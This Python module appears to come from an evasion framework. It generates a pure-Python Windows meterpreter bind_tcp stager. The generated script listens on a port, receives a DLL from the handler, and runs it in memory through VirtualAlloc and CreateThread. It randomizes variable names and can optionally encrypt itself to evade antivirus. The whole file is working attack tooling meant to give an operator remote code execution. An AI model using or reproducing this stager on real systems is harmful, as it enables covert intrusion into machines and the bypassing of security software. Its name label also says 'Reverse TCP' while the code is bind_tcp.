"""

Custom-written pure python meterpreter/bind_tcp stager.

"""

from Tools.Evasion.evasion_common import evasion_helpers
from Tools.Evasion.evasion_common import encryption


class PayloadModule:

    def __init__(self, cli_obj):


        # required options
        self.description = "pure windows/meterpreter/bind_tcp stager, no shellcode"
        self.rating = "Excellent"
        self.name = "Pure Python Reverse TCP stager"
        self.path = "python/meterpreter/bind_tcp"
        self.cli_opts = cli_obj
        self.payload_source_code = ''
        self.language = "python"
        self.extension = "py"
        if cli_obj.ordnance_payload is not None:
            self.payload_type = cli_obj.ordnance_payload
        elif cli_obj.msfvenom is not None:
            self.payload_type = cli_obj.msfvenom
        elif not cli_obj.tool:
            self.payload_type = ''

        # optional
        # options we require user interaction for- format is {OPTION : [Value, Description]]}
        self.required_options = {
            "COMPILE_TO_EXE" : ["Y", "Compile to an executable"],
            "RHOST"        : ["", "The listen target address"],
            "LPORT"        : ["4444", "The listen port"],
            "USE_PYHERION"   : ["N", "Use the pyherion encrypter"]}

    def generate(self):

        # randomize all of the variable names used
        shellCodeName = evasion_helpers.randomString()
        socketName = evasion_helpers.randomString()
        clientSocketName = evasion_helpers.randomString()
        getDataMethodName = evasion_helpers.randomString()
        fdBufName = evasion_helpers.randomString()
        rcvStringName = evasion_helpers.randomString()
        rcvCStringName = evasion_helpers.randomString()

        injectMethodName = evasion_helpers.randomString()
        tempShellcodeName = evasion_helpers.randomString()
        shellcodeBufName = evasion_helpers.randomString()
        fpName = evasion_helpers.randomString()
        tempCBuffer = evasion_helpers.randomString()


        payload_code = "import struct, socket, binascii, ctypes, random, time\n"

        # socket and shellcode variables that need to be kept global
        payload_code += "%s, %s = None, None\n" % (shellCodeName,socketName)

        # build the method that creates a socket, connects to the handler,
        # and downloads/patches the meterpreter .dll
        payload_code += "def %s():\n" %(getDataMethodName)
        payload_code += "\ttry:\n"
        payload_code += "\t\tglobal %s\n" %(socketName)
        payload_code += "\t\tglobal %s\n" %(clientSocketName)
        # build the socket and connect to the handler
        payload_code += "\t\t%s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n" %(socketName)
        payload_code += "\t\t%s.bind(('%s', %s))\n" %(socketName,self.required_options["RHOST"][0], str(self.required_options["LPORT"][0]))
        payload_code += "\t\t%s.listen(1)\n" % (socketName)
        payload_code += "\t\t%s,_ = %s.accept()\n" % (clientSocketName, socketName)
        # pack the underlying socket file descriptor into a c structure
        payload_code += "\t\t%s = struct.pack('<i', %s.fileno())\n" % (fdBufName,clientSocketName)
        # unpack the length of the payload, received as a 4 byte array from the handler
        payload_code += "\t\tl = struct.unpack('<i', %s.recv(4))[0]\n" %(clientSocketName)
        payload_code += "\t\t" + rcvStringName + " = b\"     \"\n"
        # receive ALL of the payload .dll data
        payload_code += "\t\twhile len(%s) < l: %s += %s.recv(l)\n" % (rcvStringName, rcvStringName, clientSocketName)
        payload_code += "\t\t%s = ctypes.create_string_buffer(%s, len(%s))\n" % (rcvCStringName,rcvStringName,rcvStringName)
        # prepend a little assembly magic to push the socket fd into the edi register
        payload_code += "\t\t%s[0] = binascii.unhexlify('BF')\n" %(rcvCStringName)
        # copy the socket fd in
        payload_code += "\t\tfor i in range(4): %s[i+1] = %s[i]\n" % (rcvCStringName, fdBufName)
        payload_code += "\t\treturn %s\n" % (rcvCStringName)
        payload_code += "\texcept: return None\n"

        # build the method that injects the .dll into memory
        payload_code += "def %s(%s):\n" %(injectMethodName,tempShellcodeName)
        payload_code += "\tif %s != None:\n" %(tempShellcodeName)
        payload_code += "\t\t%s = bytearray(%s)\n" %(shellcodeBufName,tempShellcodeName)
        # allocate enough virtual memory to stuff the .dll in
        payload_code += "\t\t%s = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(%s)),ctypes.c_int(0x3000),ctypes.c_int(0x40))\n" %(fpName,shellcodeBufName)
        # virtual lock to prevent the memory from paging out to disk
        payload_code += "\t\tctypes.windll.kernel32.VirtualLock(ctypes.c_int(%s), ctypes.c_int(len(%s)))\n" %(fpName,shellcodeBufName)
        payload_code += "\t\t%s = (ctypes.c_char * len(%s)).from_buffer(%s)\n" %(tempCBuffer,shellcodeBufName,shellcodeBufName)
        # copy the .dll into the allocated memory
        payload_code += "\t\tctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(%s), %s, ctypes.c_int(len(%s)))\n" %(fpName,tempCBuffer,shellcodeBufName)
        # kick the thread off to execute the .dll
        payload_code += "\t\tht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(%s),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n" %(fpName)
        # wait for the .dll execution to finish
        payload_code += "\t\tctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))\n"

        # download the stager
        payload_code += "%s = %s()\n" %(shellCodeName, getDataMethodName)
        # inject what we grabbed
        payload_code += "%s(%s)\n" % (injectMethodName,shellCodeName)

        if self.required_options["USE_PYHERION"][0].lower() == "y":
            payload_code = encryption.pyherion(payload_code)

        self.payload_source_code = payload_code
        return
